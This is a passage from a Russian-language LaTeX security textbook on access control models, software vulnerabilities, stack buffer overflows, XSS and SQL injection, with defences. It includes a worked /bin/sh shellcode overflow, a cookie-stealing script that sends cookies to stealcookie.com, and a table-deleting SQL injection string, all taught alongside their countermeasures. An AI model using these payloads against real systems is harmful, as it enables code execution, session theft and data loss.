Одна и та же роль может использоваться несколькими различными субъектами (пользователями). В некоторых системах пользователю разрешается выполнять несколько ролей одновременно, в других есть ограничение на одну или несколько не противоречащих друг другу ролей в каждый момент времени.

Ролевая модель, в отличие от дискреционной и мандатной, позволяет реализовать разграничение полномочий пользователей, в частности, на системного администратора и офицера безопасности, что повышает защиту от человеческого фактора.


\section{Контроль доступа в ОС}
\selectlanguage{russian}

\subsection{Windows}
%http://www.gentlesecurity.com/blog/andr/cracking_windows_access_control.pdf
%http://msdn.microsoft.com/en-us/library/bb250462(VS.85).aspx#upm_ovwim
%http://msdn.microsoft.com/en-us/library/bb625963.aspx
%http://msdn.microsoft.com/en-us/library/bb625964.aspx

Операционные системы Windows, вплоть до Windows Vista, использовали только дискреционную модель безопасности. Владелец файла имел возможность изменить права доступа или разрешить доступ другому пользователю.

Начиная с Windows Vista, в дополнение к стандартной дискреционной модели субъекты и объекты стали обладать мандатным уровнем доступа, устанавливаемым администратором (или по умолчанию системой для новых созданных объектов) и имеющим приоритет над стандартным дискреционным доступом, который может менять владелец.

В Vista мандатный уровень доступа предназначен в большей степени для обеспечения \emph{целостности} и устойчивости системы, чем для обеспечения секретности.

Уровень доступа объекта (\langen{integrity level} в терминологии Windows) помечается шестнадцатеричным числом в диапазоне от \texttt{0} до \texttt{0x4000}, большее число означает более высокий уровень доступа. В Vista определены 5 базовых уровней:
\begin{itemize}
    \item ненадёжный (Untrusted, \texttt{0x0000});
    \item низкий (Low Integrity, \texttt{0x1000});
    \item средний (Medium Integrity, \texttt{0x2000});
    \item высокий (High Integrity, \texttt{0x3000});
    \item системный (System Integrity, \texttt{0x4000}).
\end{itemize}

Дополнительно объекты имеют три атрибута, которые, если они установлены, запрещают доступ субъектов с более низким уровнем доступа к ним: cубъекты с более низким уровнем доступа не могут:
\begin{itemize}
    \item читать (\langen{no read-up}),
    \item изменять (\langen{no write-up}),
    \item исполнять (\langen{no execute-up})
\end{itemize}
объекты с более высоким уровнем доступа. Для всех объектов по умолчанию установлен атрибут запрета записи объектов с более высоким уровнем доступа, чем имеет субъект (no write-up).

Субъекты имеют два атрибута:
\begin{itemize}
    \item запрет записи объектов с более высоким уровнем доступа, чем у субъекта (no write-up, эквивалентно аналогичному атрибуту объекта);
    \item установка уровня доступа созданного процесса-потомка как минимума от уровня доступа родительского процесса (субъекта) и исполняемого файла (объекта файловой системы).
\end{itemize}
Оба атрибута установлены по умолчанию.

Все пользовательские данные и процессы по умолчанию имеют средний уровень доступа, а системные файлы -- системный. Например, если в Internet Explorer, который в защищённом (\langen{protected}) режиме запускается с низким уровнем доступа, обнаружится уязвимость, злоумышленник не будет иметь возможности изменить системные данные на диске, даже если браузер запущен администратором.

Уровень доступа процесса соответствует уровню доступа пользователя (процесса), который запустил процесс. Например, пользователи LocalSystem, LocalService, NetworkService получают системный уровень, администраторы -- высокий, обычные пользователи системы -- средний, остальные (\langen{everyone}) -- низкий.

По каким-то причинам, вероятно, для целей совместимости с ранее разработанными программами и/или для упрощения разработки и настройки новых сторонних программ других производителей, субъекты с системным, высоким и средним уровнями доступа создают объекты или владеют объектами со \emph{средним} уровнем доступа. И только субъекты с низким уровнем доступа создают объекты с низким уровнем доступа. Это означает, что системный процесс может владеть файлом или создать файл со средним уровнем доступа, и другой процесс с более низким уровнем доступа, например средним, может получить доступ к файлу, в т.~ч. и на запись. Это нарушает принцип запрета записи в объекты, созданные субъектами с более высоким уровнем доступа.


\subsection{Linux}

Стандартная ОС Unix обеспечивает дискреционную модель контроля доступа на следующей основе.
\begin{itemize}
    \item Каждый субъект (процесс) и объект (файл) имеют владельца, пользователя и группу, которые могут изменять доступ к данному объекту для себя, других пользователей и групп.
    \item Каждый объект (файл) имеет атрибуты доступа на чтение (r), запись (w) и исполнение (x) для трёх типов пользователей: владельца-пользователя (u), владельца-группы (g), остальных пользователей (o) -- (u:rwx, g:rwx, o:rwx).
    \item Субъект может входить в несколько групп.
\end{itemize}

В 2000 г. Агентство Национальной Безопасности США (NSA) выпустило набор изменений SELinux с открытым исходным кодом к ядру ОС Linux версии 2.4. Начиная с версии ядра 2.6, SELinux входит как часть стандартного ядра. SELinux реализует комбинацию ролевой, мандатной и дискреционной моделей контроля доступа, которые могут быть изменены только администратором системы (и/или администратором безопасности). По сути, SELinux приписывает каждому субъекту одну или несколько ролей, и для каждой роли указано, к объектам с какими атрибутами они могут иметь доступ и какого вида.

Основная проблема ролевых систем контроля доступа -- очень большой список описания ролей и атрибутов объектов, что увеличивает сложность системы и приводит к регулярным ошибкам в таблицах описания контроля доступа.


\section{Виды программных уязвимостей}

\emph{Вирусом} называется самовоспроизводящаяся часть кода (подпрограмма)\index{вирус}, которая встраивается в носители (другие программы) для своего исполнения и распространения. Вирус не может исполняться и передаваться без своего носителя.

\emph{Червём} называется самовоспроизводящаяся отдельная (под)программа\index{червь}, которая может исполняться и распространяться самостоятельно, не используя программу-носитель.

Первой вехой в изучении компьютерных вирусов можно назвать 1949 год, когда Джон фон Нейман прочёл курс лекций в Университете Иллинойса под названием <<Теория самовоспроизводящихся машин>> (изданы в 1966~\cite{Neumann:1966}, переведены на русский язык издательством <<Мир>> в 1971 году~\cite{Neumann:1971}), в котором ввёл понятие самовоспроизводящихся механических машин. Первым сетевым вирусом считается вирус Creeper 1971 г., распространявшийся в сети ARPANET, предшественнице Интернета. Для его уничтожения был создан первый антивирус Reaper, который находил и уничтожал Creeper.

Первый червь для Интернета, червь Морриса, 1988 г., уже использовал \emph{смешанные} атаки\index{атака!смешанная} для заражения UNIX машин~\cite{EichinRochlis:1988, Spafford:1989}. Сначала программа получала доступ к удалённому запуску команд, эксплуатируя уязвимости в сервисах \texttt{sendmail}, \texttt{finger} (с использованием атаки на переполнение буфера) или \texttt{rsh}. Далее, с помощью механизма подбора паролей червь получал доступ к локальным аккаунтам пользователей:
\begin{itemize}
    \item получение доступа к учётным записям с очевидными паролями:
		\begin{itemize}
			\item без пароля вообще;
			\item имя аккаунта в качестве пароля;
			\item имя аккаунта в качестве пароля, повторённое дважды;
			\item использование <<ника>> (\langen{nickname});
			\item фамилия (\langen{last name, family name});
			\item фамилия, записанная задом наперёд;
		\end{itemize}
		\item перебор паролей на основе встроенного словаря из 432 слов;
		\item перебор паролей на основе системного словаря \texttt{/usr/dict/words}.
\end{itemize}

\emph{Программной уязвимостью}\index{программная уязвимость} называется свойство программы, позволяющее нарушить её работу. Программные уязвимости могут приводить к отказу в обслуживании (Denial of Service, DoS-атака)\index{атака!отказ в обслуживании}, утечке и изменению данных, появлению и распространению вирусов и червей.

Одной из распространённых атак для заражения персональных компьютеров является переполнение буфера в стеке. В интернет-сервисах наиболее распространённой программной уязвимостью в настоящее время является межсайтовый скриптинг (Cross-Site Scripting, XSS-атака)\index{атака!XSS}.

Наиболее распространённые программные уязвимости можно разделить на классы:
\begin{enumerate}
    \item Переполнение буфера -- копирование в буфер данных большего размера, чем длина выделенного буфера. Буфером может быть контейнер текстовой строки, массив, динамически выделяемая память и~т.\,д. Переполнение становится возможным вследствие либо отсутствия контроля над длиной копируемых данных, либо из-за ошибок в коде. Типичная ошибка -- разница в 1 байт между размерами буфера и данных при сравнении.
    \item Некорректная обработка (парсинг) данных, введённых пользователем, является причиной большинства программных уязвимостей в веб-приложениях. Под обработкой понимаются:
        \begin{enumerate}
            \item проверка на допустимые значения и тип (числовые поля не должны содержать строки и~т.\,д.);
            \item фильтрация и экранирование специальных символов, имеющих значения в скриптовых языках или применяющихся для перекодирования из одной текстовой кодировки в другую. Примеры символов: \texttt{\textbackslash}, \texttt{\%}, \texttt{<}, \texttt{>}, \texttt{"}, \texttt{'};
            \item фильтрация ключевых слов языков разметки и скриптов. Примеры: \texttt{script}, \texttt{JavaScript};
            \item перекодирование различными кодировками при парсинге. Распространённый способ обхода системы контроля парсинга данных состоит в однократном или множественном последовательном кодировании текстовых данных в шестнадцатеричные кодировки \texttt{\%NN} ASCII и UTF-8. Например, браузер или веб-приложения производят $n$-кратное перекодирование, в то время как система контроля делает $k$-кратное перекодирование, $0 \leq k < n$, и, следовательно, пропускает закодированные запрещённые символы и слова.
        \end{enumerate}
    \item Некорректное использование функций. Например, \texttt{printf(s)} может привести к уязвимости записи в память по указанному адресу. Если злоумышленник вместо обычной текстовой строки введёт в качестве \texttt{s "текст некоторой длины\%n"}, то функция \texttt{printf}, ожидающая первым аргументом строку формата \texttt{fmt}, обнаружив \texttt{\%n}, возьмёт значение из ячеек памяти, находящихся перед ячейками с указателем на текстовую строку (устройство стека описано далее), и запишет в память по адресу, равному считанному значению, количество выведенных символов на печать функцией \texttt{printf}.
\end{enumerate}


\section{Переполнение буфера в стеке}
\selectlanguage{russian}

В качестве примера переполнения буфера опишем самую распространённую атаку, направленную на исполнение кода злоумышленника.

В 64-битовой x86-64 архитектуре основное пространство виртуальной памяти процесса из 16-ти эксабайтов ($2^{64}$ байтов) свободно, и только малая часть занята (выделена). Виртуальная память выделяется процессу операционной системой блоками по 4 кБ, называемыми страницами памяти. Выделенные страницы соответствуют страницам физической оперативной памяти или страницам файлов.

Пример выделенной виртуальной памяти процесса представлен в таблице~\ref{tab:virtual-memory}. Локальные переменные функций хранятся в области памяти, называемой стеком.

Приведём пример переполнения буфера в стеке\index{стек}, которое даёт возможность исполнить код для 64-разрядной ОС Linux. Ниже приводится листинг исходной программы, которая печатает расстояние Хэмминга между векторами $b1 = \text{\texttt{0x01234567}}$ и $b2 = \text{\texttt{0x89ABCDEF}}$.

\begin{verbatim}
#include <stdio.h>
#include <string.h>

int hamming_distance(unsigned a1, unsigned a2, char *text,
                     size_t textsize) {
  char buf[32];
  unsigned distance = 0;
  unsigned diff = a1 ^ a2;
  while (diff) {
    if (diff & 1) distance++;
    diff >>= 1;
  }
  memcpy(buf, text, textsize);
  printf("%s: %i\n", buf, distance);
  return distance;
}

int main() {
  char text[68] = "Hamming";
  unsigned b1 = 0x01234567;
  unsigned b2 = 0x89ABCDEF;
  return hamming_distance(b1, b2, text, 8);
}
\end{verbatim}

\begin{table}[!ht]
    \centering
    \caption{Пример структуры виртуальной памяти процесса\label{tab:virtual-memory}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{r|c|}
        \multicolumn{2}{c}{Адрес ~~~~~~~~~~~~~~ Использование} \\
        \cline{2-2}
        \texttt{0x00000000 00000000} & \\
        & \\
        \cdashline{2-2}
        \texttt{0x00000000 0040063F} & \multirow{2}{*}{\parbox{6cm}{Исполняемый код, динамические библиотеки}} \\
        & \\
        \cdashline{2-2}
        & \\
        & \\
        & \\
        \cdashline{2-2}
        \texttt{0x00000000 0143E010} & \multirow{2}{*}{Динамическая память} \\
        & \\
        \cdashline{2-2}
        & \\
        & \\
        & \\
        \cdashline{2-2}
        \texttt{0x00007FFF A425DF26} & \multirow{2}{*}{Переменные среды} \\
        & \\
        \cdashline{2-2}
        & \\
        & \\
        & \\
        \cdashline{2-2}
        \texttt{0x00007FFF FFFFEB60} & \multirow{2}{*}{Стек функций} \\
        & \\
        \cdashline{2-2}
        & \\
        & \\
        \texttt{0xFFFFFFFF FFFFFFFF} & \\
        \cline{2-2}
    \end{tabular} }
\end{table}

Вывод программы при запуске:
\begin{verbatim}
$ ./hamming
Hamming: 8
\end{verbatim}

При вызове вложенных функций вызывающая функция выделяет стековый кадр для вызываемой функции в сторону уменьшения адресов. Стековый кадр в порядке уменьшения адресов состоит из следующих частей:
\begin{enumerate}
    \item Аргументы вызова функции, расположенные в порядке уменьшения адреса (за исключением тех, которые передаются в регистрах процессора).
    \item Сохранённый регистр процессора \texttt{rip} внешней функции, также называемый адресом возврата. Регистр процессора \texttt{rip} содержит адрес следующей инструкции для исполнения. При входе во вложенную функцию адрес инструкции текущей функции запоминается в стеке, в регистре записывается новое значение адреса первой инструкции из вложенной функции, а по завершении функции регистр восстанавливается из стека, и, таким образом, исполнение возвращается назад.
    \item Сохранённый регистр процессора \texttt{rbp} внешней функции. Регистр процессора \texttt{rbp} содержит адрес сохранённого регистра \texttt{rbp} в стековом кадре вызывающей функции. Процессор обращается к локальным переменным функций по смещению относительно регистра \texttt{rbp}. При вызове вложенной функции регистр сохраняется в стеке, в регистр записывается текущее значение адреса стека (\texttt{rsp}), а по завершении функции, регистр восстанавливается.
    \item Локальные переменные, как правило, расположенные в порядке уменьшения адреса при объявлении новой переменной (порядок может быть изменён в результате оптимизаций и использования механизмов защиты, таких как Stack Smashing Protection в компиляторе GCC).
\end{enumerate}

Адрес начала стека, а также, возможно, адреса локальных массивов и переменных выровнены по границе параграфа в 16 байтов, из-за чего в стеке могут образоваться неиспользуемые байты.

Если в программе имеется ошибка, которая может привести к переполнению выделенного буфера в стеке при копировании, есть возможность записать вместо сохранённого значения регистра \texttt{rip} новое. В результате по завершении данной функции исполнение начнётся с указанного адреса. Если есть возможность записать в переполняемый буфер исполняемый код, а затем на место сохранённого регистра \texttt{rip} адрес на этот код, то получим исполнение заданного кода в стеке функции.

На рис.~\ref{fig:stack-overflow} приведены исходный стек и стек с переполненным буфером, из-за которого записалось новое сохранённое значение \texttt{rip}.

\begin{figure}[!ht]
	\centering
	\includegraphics[width=0.95\textwidth]{pic/stack-overflow}
	\caption{Исходный стек и стек с переполнением буфера\label{fig:stack-overflow}}
\end{figure}


Изменим программу для демонстрации, поместив в копируемую строку исполняемый код для вызова \texttt{/bin/sh}.
{ \small
\begin{verbatim}
...
int main() {
  char text[68] =
    // 28 байтов исполняемого кода
    "\x90" "\x90" "\x90"                // nop; nop; nop
    "\x48\x31" "\xD2"                   // xor %rdx, %rdx
    "\x48\x31" "\xF6"                   // xor %rsi, %rsi
    "\x48\xBF" "\xDC\xEA\xFF\xFF"
    "\xFF\x7F\x00\x00"                  // mov $0x7fffffffeadc,
                                        //   %rdi
    "\x48\xC7\xC0" "\x3B\x00\x00\x00"   // mov $0x3b, %rax
    "\x0F\x05"                          // syscall
    // 8 байтов строки /bin/sh
    "\x2F\x62\x69\x6E\x2F\x73\x68\x00"  // "/bin/sh\0"
    // 12 байтов заполнения и 16 байтов новых
    // значений сохранённых регистров
    "\x00\x00\x00\x00"                  // незанятые байты
    "\x00\x00\x00\x00"                  // unsigned distance
    "\x00\x00\x00\x00"                  // unsigned diff
    "\x50\xEB\xFF\xFF"                  // регистр
    "\xFF\x7F\x00\x00"                  //   rbp=0x7fffffffeb50
    "\xC0\xEA\xFF\xFF"                  // регистр
    "\xFF\x7F\x00\x00";                 //   rip=0x7fffffffeac0
  ...
  hamming_distance(b1, b2, text, 68);
  return 0;
}
\end{verbatim} }

Код эквивалентен вызову функции \texttt{execve(``/bin/sh'', 0, 0)} через системный вызов функции ядра Linux для запуска оболочки среды \texttt{/bin/sh}. При системном вызове нужно записать в регистр \texttt{rax} номер системной функции, а в другие регистры процессора -- аргументы. Данный системный вызов с номером \texttt{0x3b} требует в качестве аргументов регистры \texttt{rdi} с адресом строки исполняемой программы, \texttt{rsi} и \texttt{rdx} с адресами строк параметров запускаемой программы и переменных среды. В примере в \texttt{rdi} записывается адрес \texttt{0x7fffffffeadc}, который указывает на строку \texttt{``/bin/sh''} в стеке после копирования. Регистры \texttt{rdx} и \texttt{rsi} обнуляются.

На рис.~\ref{fig:stack-overflow} приведён стек с переполненным буфером, в котором записалось новое сохранённое значение \texttt{rip}, указывающее на заданный код в стеке.

Начальные инструкции \texttt{nop} с кодом \texttt{0x90} означают пустые операции. Часто точные значения адреса и структуры стека неизвестны, поэтому злоумышленник угадывает предполагаемый адрес стека. В начале исполняемого кода создаётся массив из операций \texttt{nop} с надеждой на то, что предполагаемое значение стека, то есть требуемый адрес \texttt{rip}, попадёт на эти операции, повысив шансы угадывания. Стандартная атака на переполнение буфера с исполнением кода также подразумевает последовательный перебор предполагаемых адресов для нахождения правильного адреса для \texttt{rip}.

В результате переполнения буфера в примере по завершении функции \texttt{hamming\_distance()} начнёт исполняться инструкция с адреса строки \texttt{buf}, то есть заданный код.


\subsection{Защита}

Лучший способ защиты от атак переполнения буфера -- создание программного кода со слежением за размером данных и длиной буфера. Однако ошибки всё равно происходят. Существует несколько стандартных способов защиты от исполнения кода в стеке в архитектуре x86 (x86-64).

\begin{enumerate}
	\item Современные 64-разрядные x86-64 процессоры включают поддержку флагов доступа к страницам памяти. В таблице виртуальной памяти, выделенной процессу, каждая страница имеет набор флагов, отвечающих за защиту страниц от некорректных действий программы:
		\begin{itemize}
		\item флаг разрешения доступа из пользовательского режима -- если флаг не установлен, то доступ к данной области памяти возможен только из режима ядра;
		\item флаг запрета записи -- если флаг установлен, то попытка выполнить запись в данную область памяти приведёт к возникновению исключения;
		\item флаг запрета исполнения\index{бит запрета исполнения} (NX-Bit, No eXecute Bit в терминологии AMD; XD-Bit, Execute Disable Bit в терминологии Intel; DEP, Data Execution Prevention -- соответствующая опция защиты в операционных системах) -- если флаг установлен, то при попытке передачи управления на данную область памяти возникнет исключение. Для совместимости со старым программным обеспечением есть возможность отключить использование данного флага на уровне операционной системы целиком или для отдельных программ.
	\end{itemize}
	Попытка выполнить операции, которые запрещены соответствующими настройками виртуальной памяти, вызывает ошибку сегментации (\langen{segmentation fault, segfault}).

    \item Второй стандартный способ -- вставка проверочных символов (\langen{canaries, guards}) после массивов и в конце стека и их проверка перед выходом из функции. Если произошло переполнение буфера, программа аварийно завершится. Данный способ защиты реализован с помощью модификации конечного кода программы во время компиляции\footnote{См. опции \texttt{-fstack-protector} для GCC, \texttt{/GS} для компиляторов от Microsoft и другие.}, его нельзя включить или отключить без перекомпиляции программного обеспечения.

    \item Третий способ -- рандомизация адресного пространства (\langen{address space layout randomization, ASLR}), то есть случайное расположение стека, кода и~т.\,д. В настоящее время используется в большинстве современных операционных систем (Android, iOS, Linux, OpenBSD, macOS, Windows). Это приводит к маловероятному угадыванию адресов и значительно усложняет использование уязвимости.
\end{enumerate}

\subsection{Другие атаки с переполнением буфера}

Почти любую возможность для переполнения буфера в стеке или динамической памяти можно использовать для получения критической ошибки в программе из-за обращения к адресам виртуальной памяти, страницы которых не были выделены процессу. Следовательно, можно проводить атаки отказа в обслуживании (\langen{Denial of Service (DoS) attacks}).

Переполнение буфера в динамической памяти, в случае хранения в ней адресов для вызова функций, может привести к подмене адресов и исполнению другого кода.

В описанных DoS-атаках NX-бит не защищает систему.


\section{Межсайтовый скриптинг}\index{атака!XSS}
\selectlanguage{russian}

Другой вид распространённых программных уязвимостей состоит в некорректной обработке данных, введённых пользователем. Типичные примеры: отсутствующее или неправильное экранирование специальных символов и полей (спецсимволы \texttt{<} и \texttt{>} HTML, кавычки, слэши \texttt{/}, \texttt{\textbackslash}) и отсутствующая или неправильная проверка введённых данных на допустимые значения (SQL-запрос к базе данных веб-ресурса вместо логина пользователя).

Межсайтовый скриптинг (\langen{Cross-Site Scripting, XSS}) заключается во внедрении в веб-страницу злоумышленником $A$ исполняемого текстового скрипта, который будет исполнен браузером клиента $B$. Скрипт может быть на языках JavaScript, VBScript, ActiveX, HTML, Flash. Целью атаки является, как правило, доступ к информации клиента.

Скрипт может получить доступ к cookie-файлам данного сайта, например с аутентификатором, вставить гиперссылки на свой сайт под видом доверенных ссылок. Вставленные гиперссылки могут содержать информацию пользователя.

Скрипт также может выполнить последовательность HTTP GET- и POST-запросов на веб-сайт для выполнения действий от имени пользователя. Например вирусно распространить вредоносный JavaScript код со страницы одного пользователя на страницы всех друзей, друзей друзей и~т.\,д., а затем удалить все данные пользователя. Атака может привести к уничтожению социальной сети.

Приведём пример кражи cookie-файла веб-сайта, который имеет уязвимость на вставку текста, содержащего исполняемый браузером код.

%Когда браузер первый раз обращается к сайту, веб-приложение может выслать вместе с HTML страницей cookie-файл, хранящий текстовую строку последовательностей

Пусть аутентификатор пользователя в cookie-файле сайта \texttt{myemail.com} содержит
\begin{center} \begin{verbatim}
auth=AJHVML43LDSL42SC6DF;
\end{verbatim} \end{center}

Пусть текстовое сообщение, размещённое пользователем, содержит скрипт, помещающий на странице <<изображение>>, расположенное по некоему адресу
\begin{verbatim}
<script>
  new Image().src = "http://stealcookie.com?c=" +
    encodeURI(document.cookie);
</script>
\end{verbatim}

Тогда браузер всех пользователей, которым показывается сообщение, при загрузке страницы отправит HTTP GET-запрос на получение файла <<изображения>> по адресу
\begin{center} \begin{verbatim}
http://stealcookie.com?auth=AJHVML43LDSL42SC6DF;
\end{verbatim} \end{center}

В результате злоумышленник получит cookie, используя который он сможет заходить на веб-сайт под видом пользователя.

Вставка гиперссылок является наиболее частой XSS-атакой. Иногда ссылки кодируются шестнадцатеричными числами вида \texttt{\%NN}, чтобы не вызывать сомнения у пользователя текстом ссылки.
%Браузер самостоятельно не может отослать данные на другой сайт, отличный от текущего, поэтому передаваемая информация содержится в гиперссылках.

%(например, JavaScript код), либо программным обеспечением, генерирующим HTML-страницу для выдачи клиенту $B$ (например, PHP код). Цель XSS атаки -- либо выполнение JavaScript кода браузером клиента, либо выполнение скриптового кода на веб-сервере при запросе клиента к нему.

%Простой пример -- веб-форум. Пользователи вводят в формы текстовые сообщения, которые запоминаются в БД и показываются другим пользователям. Страница форума генерируется каждый раз заново при запросе пользователей информационной системой. Генерирование часто происходит из шаблона страницы, который содержит и базовый статический HTML код страницы, и исполняемый код скрипта для вставки динамического содержания на основе запроса к базе данных. Как правило, злоумышленник пользуется во время генерирования страницы некорректным экранированием текста, введённого им в формах ввода текста вебстраницы, кавычек, слэшей. То есть, текстовые значения полей, которые сохраняются в базе данных веб-сайта и отображаются другим пользователям, содержат исполняемый код злоумышленника.

На 2009 г. 80\% обнаруженных уязвимостей веб-сайтов являются XSS-уязвимостями.

Стандартный способ защиты от XSS-атак заключается в фильтрации, замене, экранировании символов и слов введённого пользователем текста: \texttt{<}, \texttt{>}, \texttt{/}, \texttt{\textbackslash}, \texttt{"}, \texttt{'}, \texttt{(}, \texttt{)}, \texttt{script}, \texttt{javascript} и~др., а также в обработке кодировок символов.


\section[SQL-инъекции с исполнением кода веб-сервером]{SQL-инъекции с исполнением кода \protect\\ базой данных интернет-сервиса}
\selectlanguage{russian}

Второй классической уязвимостью веб-приложений являются SQL-инъекции, когда пользователь имеет возможность поменять смысл запроса к базе данных веб-сервера. Запрос делается в виде текстовой строки на скриптовом языке SQL. Например, выражение
\begin{verbatim}
s = "SELECT * FROM Users WHERE Name = '" + username + "';"
\end{verbatim}
предназначено для получения информации о пользователе \texttt{username}. Однако если пользователь вместо имени введёт строку вида
\begin{center} \begin{verbatim}
john';  DELETE * FROM Users;  SELECT * FROM Users WHERE
  Name = 'john,
\end{verbatim} \end{center}
то выражение превратится в три SQL-операции:
%{\color{red} Проверить в каких системах будет работать. В JDBC PrepareStatement требует одно выражение, а ExecutableStatement использовать нельзя, так как он не возвращает значения.}
\begin{verbatim}
-- запрос о пользователе john
SELECT * FROM Users WHERE Name = 'john';
– удаление всех пользователей
DELETE FROM Users;
-- запрос о пользователе john
SELECT * FROM Users WHERE Name = 'john';
\end{verbatim}
При выполнении этого SQL-запроса к базе данных все записи пользователей будут удалены.

Уязвимости в SQL-выражениях являются частным случаем уязвимостей, связанных с использованием сложных систем с разными языками управления данными и, следовательно, с разными системами экранирования специальных символов и контроля над типом данных. Когда веб-сервер принимает от клиента данные, закодированные обычно с помощью <<application/x-www-form-urlencoded>>~\cite{html4:1999}, специальные символы (пробелы, неалфавитные символы и ~т.~д.) корректно экранируются браузером и восстанавливаются непосредственно веб-сервером или стандартными программными библиотеками. Аналогично, когда SQL-сервер передаёт или принимает данные от клиентской библиотеки, внутренним протоколом общения с SQL-сервером происходит кодировка текста, который является частью пользовательских данных. Однако на стыке контекстов -- в тот момент, когда программа, выполняющаяся на веб-сервере, уже приняла данные от пользователя по HTTP-протоколу\index{протокол!HTTP} и собирается передать их SQL-серверу в качестве составной части SQL-команды -- перед программистом стоит сложная задача учёта, в худшем случае, трёх контекстов и кодировок: входного контекста протокола общения с клиентом (HTTP), контекста языка программирования (с соответствующим оформлением и экранированием специальных символов в текстовых константах) и контекста языка управления данными SQL-сервера.

Ситуация усложняется тем, что программист может являться специалистом в языке программирования, но может быть не знаком с особенностями языка SQL или, что чаще, конкретным диалектом языка SQL, используемым СУБД.

Метод защиты заключается в \emph{разделении} кода и данных. Для защиты от приведённых атак на базу данных следует использовать параметрические запросы к базе данных с \emph{фиксированным} SQL-выражением. Например, в JDBC~\cite{jdbc:2006}:
\begin{verbatim}
PreparedStatement p = conn.prepareStatement(
    "SELECT * FROM Users WHERE Name=?");
p.setString(1, username);.
\end{verbatim}

Таким образом, задача корректного оформления текстовых данных для передачи на SQL-сервер перекладывается на драйвер общения с СУБД, в котором эта задача обычно решена корректно авторами драйвера, хорошо знающими особенности протокола и языка управления данными сервера.


%\chapter{Послесловие}
%Это должно быть что-то в виде заключения, объяснения, почему именно эти темы выбраны, насколько актуален материал с теоретической и практической точки зрения.

\subimport*{appendix/}{index}

\printindex

\printbibliography[heading=bibintoc,title={Литература}]

\end{document}
